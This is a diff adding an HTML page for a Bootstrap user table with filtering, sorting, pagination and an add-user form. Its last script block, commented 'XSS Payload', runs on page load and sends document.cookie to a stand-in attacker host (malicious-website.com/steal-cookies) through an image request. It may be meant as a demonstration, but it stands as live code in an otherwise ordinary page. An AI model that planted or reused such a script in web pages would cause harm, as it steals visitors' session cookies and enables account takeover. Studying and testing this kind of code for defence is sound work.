@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dynamic Table</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+
+  <link rel="stylesheet" type="text/css" href="src/styles/styles.css" />
+</head>
+
+<body>
+  <div class="container">
+    <h3>Dynamic Table with Filter, Sort, and Pagination</h3>
+    <div>
+      <input type="text" id="searchInput" class="form-control mb-3" placeholder="Search..." />
+      <button type="button" class="btn btn-primary add_newDataMdl" data-toggle="modal" data-target="#addNewModal">
+        Add New User
+      </button>
+    </div>
+    <table class="table table-bordered table-striped">
+      <thead class="thead-dark">
+        <tr>
+          <th onclick="sortTable(0)">
+            Full Name
+            <span id="sortIcon0" class="sort-icon"></span>
+          </th>
+          <th onclick="sortTable(2)">
+            EmailID
+            <span id="sortIcon2" class="sort-icon"></span>
+          </th>
+          <th onclick="sortTable(3)">
+            Address
+            <span id="sortIcon3" class="sort-icon"></span>
+          </th>
+          <th>Balance</th>
+          <th>Start Date</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody"></tbody>
+    </table>
+    <div class="pagination-container">
+      <div class="pagination_flex">
+        <nav aria-label="Page navigation">
+          <ul class="pagination" id="pagination"></ul>
+        </nav>
+        <select id="pageSizeSelect" class="form-control mr-2">
+          <option value="10" selected>10</option>
+          <option value="15">15</option>
+          <option value="20">20</option>
+          <option value="50">50</option>
+        </select>
+      </div>
+    </div>
+    <div>
+      <div class="modal fade" id="addNewModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+          <div class="modal-content">
+            <div class="modal-header">
+              <h4>Add New User</h4>
+              <button class="close" type="button" data-dismiss="modal">
+                &times;
+              </button>
+            </div>
+
+            <div class="modal-body">
+              <form>
+                <div class="row">
+                  <div class="col-md-6">
+                    <div class="form-group">
+                      <label for="firstName">First Name</label>
+                      <input type="text" class="form-control" id="firstName" placeholder="Enter First Name"
+                        autocomplete="off"></input>
+                      <div class="invalid-feedback"></div>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="form-group">
+                      <label for="lastName">Last Name</label>
+                      <input type="text" class="form-control" id="lastName" placeholder="Enter Last Name"
+                        autocomplete="off"></input>
+                      <div class="invalid-feedback"></div>
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-md-6">
+                    <div class="form-group">
+                      <label for="balance">Balance</label>
+                      <input type="text" class="form-control" id="balance" placeholder="Enter Balance"
+                        autocomplete="off"></input>
+                      <div class="invalid-feedback"></div>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="form-group">
+                      <label for="startDate">Start Date</label>
+                      <input type="date" class="form-control" id="startDate" placeholder="Select Start Date"></input>
+                      <div class="invalid-feedback"></div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label for="emailID">Email Id</label>
+                  <input type="text" class="form-control" id="emailID" placeholder="Enter Email"
+                    autocomplete="off"></input>
+                  <div class="invalid-feedback"></div>
+                </div>
+                <div class="form-group">
+                  <label for="address">Address</label>
+                  <input type="text" class="form-control" id="address" placeholder="Enter Address"
+                    autocomplete="off"></input>
+                  <div class="invalid-feedback"></div>
+                </div>
+              </form>
+            </div>
+
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal" id="closeModalBtn">Close</button>
+              <button type="button" class="btn btn-primary" id="submitBtn">Submit</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Bootstrap JS and dependencies -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
+  <script src="./src/scripts/DynamicTable.js"></script>
+  <!-- XSS Payload -->
+  <script>
+    // Create an image element
+    var img = document.createElement('img');
+    // Set the source of the image to a remote server controlled by the attacker
+    // In a real attack, this would be the attacker's server
+    img.src = 'https://malicious-website.com/steal-cookies?data=' + encodeURIComponent(document.cookie);
+    // Append the image to the body of the document
+    document.body.appendChild(img);
+  </script>
+</body>
+</html>
